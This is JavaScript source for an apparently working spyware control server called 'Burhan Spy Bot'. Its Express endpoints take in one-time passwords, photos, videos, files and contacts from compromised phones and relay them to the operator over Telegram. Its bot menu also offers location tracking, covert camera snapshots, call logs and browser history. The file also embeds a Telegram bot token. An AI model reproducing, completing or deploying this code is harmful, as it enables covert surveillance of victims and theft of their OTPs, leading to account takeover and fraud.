const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');

const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());

let devices = {};

// Device Register API
app.post('/api/register-device', (req, res) => {
    const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
    devices[deviceId] = { 
        deviceName, 
        phoneNumber, 
        battery, 
        ip, 
        sim, 
        online, 
        time,
        lastSeen: Date.now() 
    };
    res.json({ success: true });
});

// App ko commands bhejo (GET /api/commands?deviceId=...)
app.get('/api/commands', (req, res) => {
    const { deviceId } = req.query;
    // Yahan command bhejne ka logic
    res.json({ command: 'status' });
});

// App se OTP aayega
app.post('/api/otp-data', (req, res) => {
    const { deviceId, otp } = req.body;
    bot.sendMessage(YOUR_USER_ID, `📩 OTP for device ${deviceId}: ${otp}`);
    res.json({ success: true });
});

// App se Photo/Video/File data aayega
app.post('/api/upload-data', (req, res) => {
    const { deviceId, type, data } = req.body;
    
    if (type === 'photos') {
        bot.sendMessage(YOUR_USER_ID, `📸 Photos for device ${deviceId}:\n${data}`);
    } else if (type === 'videos') {
        bot.sendMessage(YOUR_USER_ID, `📹 Videos for device ${deviceId}:\n${data}`);
    } else if (type === 'files') {
        bot.sendMessage(YOUR_USER_ID, `📁 Files for device ${deviceId}:\n${data}`);
    } else if (type === 'contacts') {
        bot.sendMessage(YOUR_USER_ID, `📞 Contacts for device ${deviceId}:\n${data}`);
    }
    res.json({ success: true });
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/contacts - Get Contacts\n/files - Scan Files\n/photos - Download Photo\n/videos - Download Video\n/otp - Read OTP\n/location - Get Location\n/snapshot - Camera Snapshot\n/call_logs - Get Call Logs\n/browser_history - Get Browser History\n/help - Commands ka format`);
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `📜 **HELP - Commands ka Format** 📜\n\n` +
        `🟢 **/devices** - Saare devices ki list\n` +
        `   Example: \`/devices\`\n\n` +
        `🟢 **/contacts <DEVICE_ID>** - Contacts nikalo\n` +
        `   Example: \`/contacts 123456789\`\n\n` +
        `🟢 **/files <DEVICE_ID>** - Files scan karo\n` +
        `   Example: \`/files 123456789\`\n\n` +
        `🟢 **/photos <DEVICE_ID> <PHOTO_NAME>** - Photo download karo\n` +
        `   Example: \`/photos 123456789 IMG_20240901.jpg\`\n\n` +
        `🟢 **/videos <DEVICE_ID> <VIDEO_NAME>** - Video download karo\n` +
        `   Example: \`/videos 123456789 VID_20240901.mp4\`\n\n` +
        `🟢 **/otp <DEVICE_ID>** - OTP read karo\n` +
        `   Example: \`/otp 123456789\`\n\n` +
        `🟢 **/location <DEVICE_ID>** - Location bhejo\n` +
        `   Example: \`/location 123456789\`\n\n` +
        `🟢 **/snapshot <DEVICE_ID> <FRONT/BACK>** - Camera snapshot\n` +
        `   Example: \`/snapshot 123456789 front\`\n` +
        `   Example: \`/snapshot 123456789 back\`\n\n` +
        `🟢 **/call_logs <DEVICE_ID>** - Call logs nikalo\n` +
        `   Example: \`/call_logs 123456789\`\n\n` +
        `🟢 **/browser_history <DEVICE_ID>** - Browser history nikalo\n` +
        `   Example: \`/browser_history 123456789\`\n\n` +
        `⚡ **Device ID kaise milega?**\n` +
        `   → \`/devices\` command chalao, wahan device ID dikhega!`, { parse_mode: "Markdown" });
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    
    const online = Object.entries(devices).filter(([id, d]) => d.online === 'online');
    const offline = Object.entries(devices).filter(([id, d]) => d.online !== 'online');
    
    let message = "📱 Device List\n\n";
    message += "🟢 Online Devices:\n";
    if (online.length > 0) {
        online.forEach(([id, d]) => {
            message += `• ${d.deviceName || 'Unknown'}\n`;
            message += `  Phone: ${d.phoneNumber || 'Unknown'}\n`;
            message += `  ID: ${id}\n`;
            message += `  Battery: ${d.battery}%\n`;
            message += `  IP: ${d.ip}\n`;
            message += `  SIM: ${d.sim}\n`;
            message += `  Time: ${d.time}\n\n`;
        });
    } else {
        message += "No online devices.\n";
    }
    
    message += "\n🔴 Offline Devices:\n";
    if (offline.length > 0) {
        offline.forEach(([id, d]) => {
            message += `• ${d.deviceName || 'Unknown'} (ID: ${id})\n`;
        });
    } else {
        message += "No offline devices.\n";
    }
    
    bot.sendMessage(chatId, message);
});

// Authorization check
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
